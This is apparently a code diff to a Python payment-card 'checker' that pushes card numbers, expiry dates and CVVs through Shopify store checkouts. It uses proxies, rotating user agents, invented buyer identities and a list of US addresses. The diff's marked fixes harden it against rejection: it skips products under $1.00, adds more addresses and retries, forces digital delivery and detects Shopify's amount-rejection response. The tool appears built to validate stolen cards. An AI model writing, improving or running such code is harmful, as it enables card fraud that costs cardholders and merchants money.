@@ -41,29 +41,35 @@ def _load_products():
             for line in f:
                 m = re.search(r'ID:\s*(\d+)\s*\|\s*\$?([\d.]+)\s*\|.*?\|\s*(https?://[^\s|]+)', line)
                 if m:
+                    try:
+                        price_val = float(m.group(2))
+                    except ValueError:
+                        price_val = 0.0
+                    
+                    # ═══ FIX: Skip products under $1.00 (Causes PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT) ═══
+                    if price_val < 1.00:
+                        continue
+
                     _PRODUCTS_LIST.append({
                         "vid": m.group(1), 
                         "price": m.group(2), 
                         "shop": m.group(3).strip().rstrip('/')
                     })
         if _PRODUCTS_LIST:
-            print(f"[NODE] Loaded {len(_PRODUCTS_LIST)} hardcoded products from products.txt", flush=True)
+            print(f"[NODE] Loaded {len(_PRODUCTS_LIST)} valid hardcoded products (>= $1.00)", flush=True)
     except Exception as e:
         print(f"[NODE] Error loading products.txt: {e}", flush=True)
 
 _load_products()
 
-# ═══ FIX: Thread-safe Product Shuffler ═══
 def _get_next_product():
     global _PRODUCT_POOL, _PRODUCTS_LIST
     with _PRODUCT_LOCK:
         if not _PRODUCTS_LIST:
             return None
         if not _PRODUCT_POOL:
-            # Pool is empty, refill and shuffle
             _PRODUCT_POOL = list(_PRODUCTS_LIST)
             random.shuffle(_PRODUCT_POOL)
-        # Pop from the end of the shuffled list
         return _PRODUCT_POOL.pop()
 
 _GRAPHQL_CACHE = {}
@@ -106,6 +112,8 @@ USER_AGENTS = [
 FIRST_NAMES   = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles"]
 LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
 EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]
+
+# ═══ FIX: Expanded US Address pool to prevent SHIPPING errors ═══
 ADDRESSES = [
     {"street":"100 SW Main St",           "city":"Portland",  "state":"OR","zip":"97204","phone":"+15035550100"},
     {"street":"223 Pioneer Blvd",         "city":"Salem",     "state":"OR","zip":"97301","phone":"+15035550101"},
@@ -114,6 +122,10 @@ ADDRESSES = [
     {"street":"100 W 10th St",            "city":"Wilmington","state":"DE","zip":"19801","phone":"+13025550100"},
     {"street":"500 5th Ave",              "city":"New York",  "state":"NY","zip":"10110","phone":"+12125550100"},
     {"street":"200 W Madison St",         "city":"Chicago",   "state":"IL","zip":"60606","phone":"+13125550100"},
+    {"street":"600 Congress Ave",         "city":"Austin",    "state":"TX","zip":"78701","phone":"+15125550100"},
+    {"street":"1 Market St",              "city":"San Francisco","state":"CA","zip":"94105","phone":"+14155550100"},
+    {"street":"300 S Biscayne Blvd",      "city":"Miami",     "state":"FL","zip":"33131","phone":"+13055550100"},
+    {"street":"100 Peachtree St",         "city":"Atlanta",   "state":"GA","zip":"30303","phone":"+14045550100"},
 ]
 
 def _identity():
@@ -311,7 +323,7 @@ def _vault_domain(h):
     return ""
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🔑 GRAPHQL IDS (Cached to save time)
+# 🔑 GRAPHQL IDS
 # ─────────────────────────────────────────────────────────────────────────────
 def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
     with _GRAPHQL_LOCK:
@@ -523,7 +535,6 @@ def _run_check(card_str, proxy_str):
     ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
     yyyy = "20" + yy if len(yy) == 2 else yy
 
-    # ═══ FIX: Get Unique Shuffled Product ═══
     prod = _get_next_product()
     if prod:
         shop_url = prod["shop"]
@@ -664,7 +675,8 @@ def _run_check(card_str, proxy_str):
         shipping_required = True
         r3_text = ""
 
-        for _ in range(2):  # Max 2 address attempts to save time
+        # ═══ FIX: Increased address retries to 3 to prevent SHIPPING errors ═══
+        for attempt in range(3):
             if remain() < 6:
                 return _fail("BUDGET_IN_P3", shop=shop_url)
             try:
@@ -719,6 +731,9 @@ def _run_check(card_str, proxy_str):
         merch_key = "lines" if use_lines else "merchandiseLines"
 
         def _build_submit(cur_tax, cur_total):
+            # ═══ FIX: Force NONE delivery if store says shipping isn't required (Digital) ═══
+            d_types = ["SHIPPING"] if shipping_required else ["NONE"]
+            
             return {
                 "variables": {
                     "input": {
@@ -733,7 +748,7 @@ def _run_check(card_str, proxy_str):
                                     "options": {},
                                 },
                                 "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-                                "deliveryMethodTypes":    ["SHIPPING"] if shipping_required else ["NONE"],
+                                "deliveryMethodTypes":    d_types,
                                 "expectedTotalPrice":     {"any": True},
                                 "destinationChanged":     False,
                             }],
@@ -887,6 +902,10 @@ def _run_check(card_str, proxy_str):
                     except Exception:
                         continue
             return _resp("PROCESSING_TIMEOUT", price=price_str, elapsed_ms=elapsed_ms)
+
+        # Catch Explicit Shopify Amount Rejection
+        if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in body:
+            return _resp("PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", price=price_str, elapsed_ms=elapsed_ms)
 
         code = _code(body)
         if code:
